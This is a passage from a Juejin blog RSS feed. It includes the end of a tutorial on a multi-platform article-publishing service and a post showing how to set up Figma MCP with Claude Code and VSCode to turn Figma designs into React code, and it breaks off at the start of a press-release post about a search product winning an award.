<li>进入频道页面： <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fconsole%2Fpublish%2Fchannels" target="_blank" title="https://platform.acedata.cloud/console/publish/channels" ref="nofollow noopener noreferrer">platform.acedata.cloud/console/pub…</a></li>
<li>找到需要绑定的平台（如知乎、CSDN 等）</li>
<li>点击 <strong>绑定</strong>，按提示完成第三方平台登录与授权</li>
<li>绑定成功后，频道状态应变为 <strong>有效</strong></li>
</ol>
<p><strong>检查点：</strong></p>
<ul>
<li>目标平台频道状态显示 <strong>有效</strong></li>
<li>可绑定多个频道以实现“一文多发”</li>
</ul>
<p><strong>截图2（频道管理）</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36408134ab9247d0bca180200dbd336f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=ADF2wbJVEvDIO1fOOooZezwpUTA%3D" alt="截图2-频道管理" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">4.3 步骤三：准备内容（从材料库创建文档 / 编辑文档）</h3>
<ul>
<li><strong>目标</strong>：获得可发布的文章草稿，并进行必要编辑。</li>
</ul>
<p><strong>常见路径 A：从材料库选取并生成文档</strong></p>
<ol>
<li>在“材料”库中浏览/搜索内容</li>
<li>查看标题、内容与支持频道</li>
<li>点击 <strong>预览</strong>确认内容适用</li>
<li>点击 <strong>使用</strong>：系统会将材料复制到你的“文档”列表，形成可编辑草稿</li>
</ol>
<p><strong>常见路径 B：创建原创文档（如平台支持“新建文档”）</strong></p>
<ol>
<li>在“文档”页面点击 <strong>新建</strong></li>
<li>输入标题与正文，保存为草稿</li>
</ol>
<p><strong>检查点：</strong></p>
<ul>
<li>文档已生成并可进入编辑页</li>
<li>标题、正文、格式符合目标平台发布要求</li>
</ul>
<hr/>
<h3 data-id="heading-10">4.4 步骤四：手动发布（选择频道并生成发布任务）</h3>
<ul>
<li><strong>目标</strong>：将指定文档发布到已绑定的多个频道。</li>
</ul>
<p><strong>操作：</strong></p>
<ol>
<li>在“文档”列表找到目标文章</li>
<li>进入编辑页完成最终检查（标题优化、排版、链接等）</li>
<li>点击 <strong>发布</strong></li>
<li>在弹窗中勾选要发布的 <strong>频道</strong></li>
<li>确认发布 → 系统创建 <strong>发布任务</strong></li>
</ol>
<p><strong>检查点：</strong></p>
<ul>
<li>发布任务已生成</li>
<li>状态从“进行中”变为“已完成”</li>
<li>可点击任务中的链接，跳转第三方平台确认文章已发布</li>
</ul>
<hr/>
<h3 data-id="heading-11">4.5 步骤五：查看发布任务（追踪状态与结果链接）</h3>
<ul>
<li><strong>目标</strong>：统一查看手动/自动发布的历史与结果。</li>
</ul>
<p><strong>操作：</strong></p>
<ol>
<li>进入发布任务页面（或从分发中心进入任务列表）</li>
<li>查看任务状态、发布时间、目标频道与外链</li>
<li>异常任务根据提示重试或重新授权频道</li>
</ol>
<p><strong>检查点：</strong></p>
<ul>
<li>任务状态清晰可追踪</li>
<li>已完成任务具备可访问的外链</li>
</ul>
<p><strong>截图3（发布任务）</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5911dbfe92bb41888f648db8d1122b8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=zi%2F8Ae7pfEQFQB90V2qS9ZvFLtc%3D" alt="截图3-发布任务" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-12">4.6 步骤六：启用自动发布（全自动分发）</h3>
<ul>
<li><strong>目标</strong>：开启自动发布后，系统按规则自动选取内容并发布到“有效频道”。</li>
</ul>
<p><strong>操作：</strong></p>
<ol>
<li>返回 <strong>发布中心</strong></li>
<li>找到 <strong>自动发布</strong> 模块</li>
<li>将开关从“关闭”拨动至“打开”</li>
<li>后续定期到“发布任务”确认系统自动创建的任务与完成情况</li>
</ol>
<p><strong>检查点：</strong></p>
<ul>
<li>自动发布开关处于开启状态</li>
<li>发布任务中持续出现自动任务记录</li>
</ul>
<p><strong>截图4（发布概览/摘要）</strong><br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfc63044672d4cd5a054d21d961320cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528661&amp;x-signature=vVBfxYg9TsyQvInP35ybHkDQg%2FY%3D" alt="截图4-发布概览" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-13">5. 常见问题（FAQ）</h2>
<h3 data-id="heading-14">Q1：频道绑定失败 / 状态显示“已过期”怎么办？</h3>
<ul>
<li>建议操作：先 <strong>解绑</strong> 再 <strong>重新绑定</strong>，按页面提示重新完成授权登录。</li>
<li>若仍失败：检查浏览器插件是否安装启用、第三方平台是否触发风控/二次验证。</li>
</ul>
<h3 data-id="heading-15">Q2：可以发布我自己写的原创文章吗？</h3>
<ul>
<li>可以。一般在“文档”页面支持 <strong>新建文档</strong>，创建后按“手动发布”流程发布。</li>
</ul>
<h3 data-id="heading-16">Q3：自动发布的内容不喜欢，可以干预吗？</h3>
<ul>
<li>可以。随时关闭发布中心的 <strong>自动发布</strong> 开关。</li>
<li>同时你也可以只绑定你希望自动分发的平台频道，减少不期望的平台覆盖。</li>
</ul>
<h3 data-id="heading-17">Q4：如何查看发布效果（阅读量/互动等）？</h3>
<ul>
<li>在 <strong>发布任务</strong> 中点击外链进入第三方平台查看数据；</li>
<li>平台内若有统计模块，也可在概览/报表中查看汇总。</li>
</ul>
<hr/>
<h2 data-id="heading-18">6. 总结（最短路径）</h2>
<ul>
<li><strong>插件安装成功</strong> → <strong>绑定频道（有效）</strong> → <strong>准备文档</strong> → <strong>发布并查看任务</strong> → （可选）<strong>开启自动发布</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[D2C 的另一种选择—Figma MCP + Claude Code]]></title>    <link>https://juejin.cn/post/7597253913249038377</link>    <guid>https://juejin.cn/post/7597253913249038377</guid>    <pubDate>2026-01-20T15:49:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597253913249038377" data-draft-id="7597252004714086442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="D2C 的另一种选择—Figma MCP + Claude Code"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2026-01-20T15:49:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三金得鑫"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335130216"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            D2C 的另一种选择—Figma MCP + Claude Code
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335130216/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三金得鑫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:49:28.000Z" title="Tue Jan 20 2026 15:49:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前段时间三金给大家分享了一款可以<strong>根据截图或者 URL 自动生成代码的 AI D2C 产品——ScreenshotToCode</strong>。它的原理是通过多模态模型去分析和理解上传的截图，然后再生成代码。整个流程简单来说就是：<strong>图片输入</strong> → <strong>LLM理解</strong> → <strong>直接输出代码。</strong></p>
<blockquote>
<p>原文：<a href="https://juejin.cn/post/7592823500416761882" target="_blank" title="https://juejin.cn/post/7592823500416761882">虽然 V0 很强大，但是 ScreenshotToCode 依旧有市场</a></p>
</blockquote>
<p>听起来很炫酷对吧？</p>
<p>但其实它有一个<strong>对开发人员来说无法容忍的缺陷——无法集成到开发环境中</strong>！也就是说它只能生成以单页面为主的 HTML 文件。</p>
<p>那有没有可以和开发环境完美集成的工具以及方法呢？答案肯定是有的！那就是 Figma MCP + Claude Code。</p>
<h3 data-id="heading-0">Claude Code + Figma MCP</h3>
<p>首先，假设你们公司的 UI 已经使用 Figma 设计了一款产品设计稿，并将设计稿链接发给了你；</p>
<p>然后，给你的 Claude Code 安装 Figma MCP，命令如下：</p>
<pre><code class="hljs language-bash" lang="bash">claude mcp add --transport http figma https://mcp.figma.com/mcp
</code></pre>
<p>安装好之后打开 Claude Code，并输入 <code>/mcp</code> 选择 figma：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7814bfa1fed457489876765da0e8cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=HUOnIZ8keAfrcZyzIJK7d4dXDXM%3D" alt="" loading="lazy"/></p>
<p>第一次使用时，是需要进行认证的：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a71b2ebbbe3749db824ca18b8a337e4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=CAfCojnUjZ3lbg78EdpYauD1hyg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cf4294c086e402eaddd9bcb2c884614~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=B2PNf5edadU484gtwthkrdSOM3c%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef049af0d36a4daf8bb710aaae61e853~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=ROYQLZZKSedGqcmSSKp%2FUfHlFHQ%3D" alt="" loading="lazy"/></p>
<p>点击 「Agree &amp; Allow Access」 按钮即可，成功后会提示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5486c2e2987142f5933b34233707aee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=YmXadNIASfcjf%2BRXpudgVTWFJf8%3D" alt="" loading="lazy"/></p>
<p>Claude Code 中也会有相应的提示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85c4c562af9c48c19748bce6e1172a37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=wKoJ5H0v3hFAa96hhgDZ7mJEBjk%3D" alt="" loading="lazy"/></p>
<p>接下来，我们需要打开 Figma 中的设计稿，并选中要让 AI 生成代码的部分，右击再选中「copy link to selecttion」：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a68abcd38e9444468364154fdae8e47d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=QWUjzEygT3hwRfObdRv14%2BgiJ4I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06438d2efbe9448cb844c94b064d1099~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=LS7652Iz%2FGdTOU1fLBld2Yd4AS4%3D" alt="" loading="lazy"/></p>
<p>回到 Claude Code 后我们就可以进行 AI D2C 工作了：</p>
<blockquote>
<p>输入提示词：请使用 React + Tailwind CSS 严格按照这个设计稿中的样式和交互进行还原。「这里再将刚刚复制的 Figma Url 粘贴进来」</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30cb543476f54569af81edfe7ccf8e0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=8Q%2FLVogeWJIIxho%2BCGW8d9oNQiE%3D" alt="" loading="lazy"/></p>
<p>等个几分钟，一个页面就已经画好了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9a9629914d54842a0558358ca750ee0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=9BoyB%2FfDW1SBCcw4v1A7eOmDe2c%3D" alt="" loading="lazy"/></p>
<p>启动以后检查了一下，还原度可以说达到了 95% 以上，简直完美！！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4417f4beaf94896b8665f163f98a4c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=hyEdJqPt4ZvJvP7%2B6aM4X0ngPCo%3D" alt="" loading="lazy"/></p>
<p>另外，官方还提供了 VSCode 和 Cursor 的示例，来都来了，我们再一起看下 VSCode + Figma～</p>
<h3 data-id="heading-1">VSCode + Figma MCP</h3>
<ul>
<li>按下 Command + Shift + P，输入 MCP 之后会有两种设置 MCP 的方式，一种是用户级别的设置，一种是工作区级别的设置。我们可以直接设置用户级别的</li>
<li>然后在 <code>mcp.json</code> 中粘贴以下代码，并点击启动即可进行认证，认证成功后开始进行 AI D2C：</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
   <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
   <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">"figma"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
       <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.figma.com/mcp"</span><span class="hljs-punctuation">,</span>
       <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span>
     <span class="hljs-punctuation">}</span>
   <span class="hljs-punctuation">}</span>
 <span class="hljs-punctuation">}</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4e138a4c8cf450bb8a001a194bd88fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=HmOF0lDwKfO%2BIkugIE0E2iK2yZE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de9069e5ffda4979b5aa60f5ffb88aaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=EjXXgTVyHIAqZELW%2FNnCj6vIyM0%3D" alt="" loading="lazy"/></p>
<p>打开 Github Copilot 进行 AI D2C：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/831e94e129e342d1acbe4df63ff916b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=CH%2F4EnfmK6X6Q41EsXYljbmQKEA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67868eb07e00492d84dc5ab7b4d75693~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528968&amp;x-signature=QK52yv7Hby%2BnXRgf3lnXQFG1wrM%3D" alt="" loading="lazy"/></p>
<p>不知道我不会用还是咋，Github Copilot 的产出结果让我难以置信：</p>
<ul>
<li>代码混乱</li>
<li>好多 UI 部分直接使用图层截图来实现的，比如搜索框，你根本就点击不了</li>
<li>布局混乱，列表上都出现了重叠</li>
</ul>
<p>Agent 模式下使用的模型是 GPT-4.1，响应速度非常慢，产出结果还是这个样子，体验简直糟糕透了！</p>
<p>还是推荐使用 Claude Code + GLM 4.7 吧😂</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[极限科技荣膺 2025 金猿奖 — “年度国产化优秀代表厂商”，自主可控搜索方案 Easysearch 获行业高度认可]]></title>    <link>https://juejin.cn/post/7597326073671729167</link>    <guid>https://juejin.cn/post/7597326073671729167</guid>    <pubDate>2026-01-20T15:50:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597326073671729167" data-draft-id="7597270795212423208" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="极限科技荣膺 2025 金猿奖 — “年度国产化优秀代表厂商”，自主可控搜索方案 Easysearch 获行业高度认可"/> <meta itemprop="keywords" content="数据库,搜索引擎"/> <meta itemprop="datePublished" content="2026-01-20T15:50:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="极限实验室"/> <meta itemprop="url" content="https://juejin.cn/user/1258294223312599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            极限科技荣膺 2025 金猿奖 — “年度国产化优秀代表厂商”，自主可控搜索方案 Easysearch 获行业高度认可
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1258294223312599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    极限实验室
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:50:28.000Z" title="Tue Jan 20 2026 15:50:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body 